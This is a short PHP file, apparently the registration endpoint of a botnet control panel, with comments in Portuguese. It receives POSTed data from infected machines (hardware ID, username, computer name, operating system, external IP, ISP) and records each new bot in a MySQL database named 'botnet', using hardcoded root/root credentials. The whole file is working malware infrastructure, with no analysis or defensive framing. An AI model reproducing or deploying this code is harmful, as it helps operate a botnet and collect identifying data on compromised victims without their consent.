<?php

    $date = addslashes($_POST['date']);
    $hwid = addslashes($_POST['hwid']);
    $username = addslashes($_POST['username']);
    $computername = addslashes($_POST['computername']);
    $os = addslashes($_POST['os']);
    $osarch = addslashes($_POST['osarch']);
    $eip = addslashes($_POST['eip']);
    $isp = addslashes($_POST['isp']);

    $sql = new PDO("mysql:dbname=botnet;host=localhost","root","root");
    $pdo = $sql->prepare("SELECT id from bots WHERE hwid = :h");
    $pdo->BindValue(":h",$hwid);
    $pdo->execute();
    if($pdo->rowCount() > 0)
    {
    //Verificar se ja existe o email cadastrado
    //Ja esta cadastrada(o)
    }else{                       
    $pdo = $sql->prepare("INSERT INTO bots (date,hwid,username,computername,os,osarch,eip,isp) VALUES (:d,:h,:u,:c,:o,:s,:e,:i)");
        //Caso nao, Cadastrar
    $pdo->BindValue(":d",$date);
    $pdo->BindValue(":h",$hwid);
    $pdo->BindValue(":u",$username);
    $pdo->BindValue(":c",$computername);
    $pdo->BindValue(":o",$os);
    $pdo->BindValue(":s",$osarch);
    $pdo->BindValue(":e",$eip);
    $pdo->BindValue(":i",$isp);
    $pdo->execute();                  
   }

?>
